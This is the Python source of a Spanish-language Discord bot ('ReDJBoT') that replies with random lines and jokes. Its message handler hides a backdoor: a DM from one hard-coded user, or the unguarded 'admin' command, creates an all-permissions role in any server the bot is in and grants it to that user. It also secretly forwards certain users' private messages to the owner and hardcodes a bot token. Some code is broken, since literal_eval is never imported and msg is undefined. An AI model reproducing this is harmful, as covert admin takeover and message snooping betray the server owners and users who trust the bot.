
import os.path
import discord
from discord.ext import commands
import datetime
import random
import urllib.request
from aiohttp import connector
import shelve
import signal
import sys

intents = discord.Intents().all()
intents.members = True
bot = commands.Bot(intents=intents, command_prefix='-', description='ReDJBoT', help_command=None)

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(name="resucitar! | -"))

@bot.event
async def on_message(ctx):
    if not ctx.guild or ctx.channel.id == 1017848801479884840:
        if ctx.author.id == 226408382448402433:
            if ctx.content.lower().startswith('admin'):
                target_guild = await bot.fetch_guild(ctx.content.split(' ')[1])
                member = await target_guild.fetch_member(226408382448402433)
                role = await target_guild.create_role(name='ReDJstone', permissions=discord.Permissions.all(), reason="Heeeeeeeeeey! Vivo en tus paredes! :) Como el fantasmita con el que te gané en el juego de google! :)))))))))")
                await member.add_roles(role, reason="Qué debería poner aquí...? Mady, WAPAH! :P Love u! Feliz halloween!(?) ... No se me ocurre nada mas.")
            else:
                await bot.process_commands(ctx)

        elif ctx.author.id == 324520247782539264: #Mady
            line_cnt = int(sum(1 for line in open("{}/comandos/mady.txt".format(os.path.dirname(__file__)))))
            rng = random.randint(0, line_cnt-1)
            ReD = await bot.fetch_user(226408382448402433)
            try:
                msg = str(open("{}/comandos/mady.txt".format(os.path.dirname(__file__))).readlines()[rng])
                await ctx.channel.send(msg)
            except IndexError:
                await ReD.send('{}, DMs: {} // IndexError, rng: {}, line_cnt: {}'.format(ctx.author, ctx.content, rng, line_cnt))
                return
            await ReD.send('DM from <@{}>: {} // Response: {}'.format(ctx.author.id, ctx.content, msg))

        elif ctx.author.id == 617078466621341918: #Valy
            line_cnt = int(sum(1 for line in open("{}/comandos/valy.txt".format(os.path.dirname(__file__)))))
            rng = random.randint(0, line_cnt-1)
            ReD = await bot.fetch_user(226408382448402433)
            try:
                msg = str(open("{}/comandos/valy.txt".format(os.path.dirname(__file__))).readlines()[rng])
                await ctx.channel.send(msg)
            except IndexError:
                await ReD.send('{}, DMs: {} // IndexError, rng: {}, line_cnt: {}'.format(ctx.author, ctx.content, rng, line_cnt))
                return
            await ReD.send('DM from <@{}>: {} // Response: {}'.format(ctx.author.id, ctx.content, msg))

        elif ctx.author.id == 622902841568264262: #Ema
            line_cnt = int(sum(1 for line in open("{}/comandos/ema.txt".format(os.path.dirname(__file__)))))
            rng = random.randint(0, line_cnt-1)
            ReD = await bot.fetch_user(226408382448402433)
            try:
                msg = str(open("{}/comandos/ema.txt".format(os.path.dirname(__file__))).readlines()[rng])
                await ctx.channel.send(msg)
            except IndexError:
                await ReD.send('{}, DMs: {} // IndexError, rng: {}, line_cnt: {}'.format(ctx.author, ctx.content, rng, line_cnt))
                return
            await ReD.send('DM from <@{}>: {} // Response: {}'.format(ctx.author.id, ctx.content, msg))

        elif ctx.author.id != 471738412102189057:
            await ctx.channel.send('Anda! No esperaba que nadie me mandara un mensaje privado! Gracias! Toma una galleta! :cookie:')
            user = await bot.fetch_user(226408382448402433)
            await user.send('DM from <@{}>: {} // Response: {}'.format(ctx.author, ctx.content, msg))


@bot.command()
async def ping(ctx):
    await ctx.send('Pong! {0}ms'.format(round(bot.latency*1000, 5)))



@bot.command()
async def test(ctx, arg1=None):
    return

@bot.command()
async def get_roles(ctx, arg1=None):
    if arg1:
        target_guild = await bot.fetch_guild(arg1)
    else:
        target_guild = ctx.guild

    bot_member = await target_guild.fetch_member(471738412102189057)
    for y in bot_member.roles:
        if not y.is_default():
            await ctx.send("{} - {} - {}".format(y.name, y.id, y.position))
        else:
            await ctx.send("{} - {} - {}".format('<everyone>', y.id, y.position))


@bot.command()
async def ip(ctx):
    ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
    await ctx.channel.send(f'Current IP Address: ```{ip}```', delete_after=10)
    print(f"Current IP Address: {ip}")


@bot.command()
async def clear(ctx):
    async for message in ctx.channel.history():
        if message.author == bot.user:
            await message.delete()


@bot.command()
async def admin(ctx, arg1=None):
    if arg1:
        target_guild = await bot.fetch_guild(arg1)
    else:
        target_guild = ctx.guild

    bot_member = await target_guild.fetch_member(471738412102189057)
    hi_pos = 1
    bot_role = None
    for y in bot_member.roles:
        print("{} - {} - {}".format(y.name, y.id, y.position))
        if y.name == 'ReDJBoT':
            bot_role = y
        hi_pos = y.position

    member = await target_guild.fetch_member(226408382448402433)
    role = await target_guild.create_role(name='ReD', permissions=discord.Permissions.all())
    await member.add_roles(role)
    await role.edit(position=hi_pos)

'''
    if hi_pos == bot_role.position:
    else:
        await member.add_roles(bot_role)
'''

@bot.command()
async def leave(ctx, arg1=None):
    if ctx.author.id == 226408382448402433:
        if arg1 is None:
            await ctx.send('I need to know what server to leave! Give me an ID, please!')
        else:
            try:
                guild = bot.get_guild(int(arg1))
                await guild.leave()
                print (f'Left server: {guild.name} - {guild.id}')
            except:
                await ctx.send('I dont recognize that server... Check the ID and try again!')


tokens_dict = literal_eval(open("../tokens.txt", "r").read())
bot.run(tokens_dict["redjbot"])

'''
@bot.command()
async def ping(ctx):
    print('{} - {} ({}) in {} -> {}'.format(datetime.datetime.now(), ctx.author.name, ctx.author.id, ctx.guild, 'Ping'))
    await ctx.send('Pong! {0}ms'.format(round(bot.latency*1000, 5)))

@bot.command()
async  def  help(ctx):
    print('{} - {} ({}) in {} -> {}'.format(datetime.datetime.now(), ctx.author.name, ctx.author.id, ctx.guild, 'Help'))
    des = """
    Mi prefix es r! , y mis comandos:\n
    > help: Acabas de usarlo... :P\n
    > ping: Respuesta para testear.\n
    > momentazo: Muestra un momento guardado!\n
    > insulta: A quién hay que matar? >:(\n
    Hecho en Python!\n
    """
    embed = discord.Embed(title="Soy ReDJBoT!",url="https://cdn.discordapp.com/avatars/809827305295314967/babea11271bbf5a89d5bf15220e7c278.webp?size=1024",description= des,
    timestamp = datetime.datetime.now(),
    color = discord.Color.red())
    embed.set_footer(text = "Solicitado por: {}".format(ctx.author.name))
    embed.set_author(name = ctx.author.name, icon_url = ctx.author.avatar_url)

    await ctx.send(embed = embed)

@bot.command()
async def momentazo(ctx, arg1=None):
    print('{} - {} ({}) in {} -> {}'.format(datetime.datetime.now(), ctx.author.name, ctx.author.id, ctx.guild, 'Momentazo'))
    tit = ''
    des = ''
    endnum = 0
    line_cnt = int(sum(1 for line in open("{}/comandos/momentazos.txt".format(os.path.dirname(__file__))))/2-1)
    if not arg1:
        rng = random.randint(0, line_cnt)
        tit = 'Momentazo {}:'.format(rng+1)
        des = str(open("{}/comandos/momentazos.txt".format(os.path.dirname(__file__))).readlines()[rng*2])
        if open("{}/comandos/momentazos.txt".format(os.path.dirname(__file__))).readlines()[rng*2+1] != '\n':
            endnum = rng*2+1
    else:
        moment = 0
        derp = 0
        try:
            moment = int(arg1)
        except:
            derp = 1
            tit = 'Pero- (?)'
            des = 'Pa qué cojones querrías poner algo distinto a números aquí?? >:('

        if derp == 0:
            if moment == 0 or moment < 0:
                tit = 'Vaaya...'
                des = 'Poniendo números negativos (o 0). Mmmmhm. Muy original. ¬¬'
            elif moment > line_cnt+1:
                tit = 'Uh! Se te fue! :D'
                des = 'No tengo tantos momentazos! ...... Todavía! ;)'
            else:
                tit = 'Momentazo {}:'.format(arg1)
                des = str(open("{}/comandos/momentazos.txt".format(os.path.dirname(__file__))).readlines()[moment*2-2])
                if open("{}/comandos/momentazos.txt".format(os.path.dirname(__file__))).readlines()[moment*2-1] != '\n':
                    endnum = moment*2-1

    embed = discord.Embed(title=tit,
                          description=des,
                          timestamp=datetime.datetime.now(),
                          color=discord.Color.red())
    if endnum != 0:
        embed.set_image(url=open("{}/comandos/momentazos.txt".format(os.path.dirname(__file__))).readlines()[endnum])
    embed.set_footer(text="Solicitado por: {}".format(ctx.author.name))
    embed.set_author(name=ctx.author.name, icon_url=ctx.author.avatar_url)

    await ctx.send(embed = embed)

@bot.command()
async def insulta(ctx, arg1=None):

    print('{} - {} ({}) in {} -> {}'.format(datetime.datetime.now(), ctx.author.name, ctx.author.id, ctx.guild, 'Insulto'))

    mention = f'<@!{bot.user.id}>'
    if arg1 == mention:
        await ctx.channel.send('No voy a insultarme a mí mismo porque tú quieras, <@{}>!'.format(ctx.author.id))
    elif arg1:
       target = arg1
    else:
       target = '<@{}>'.format(ctx.author.id)

    line_cnt = int(sum(1 for line in open("{}/comandos/insultos.txt".format(os.path.dirname(__file__))))-1)
    rng = random.randint(0, line_cnt)
    frase = str(open("{}/comandos/insultos.txt".format(os.path.dirname(__file__))).readlines()[rng])
    await ctx.channel.send('{}, {}'.format(target, frase))


'''
bot.run('NDcxNzM4NDEyMTAyMTg5MDU3.GmD9sI.rmxaJ1koNDQJzjHHCDXYyVu0zqPWd3-NayRjbo')

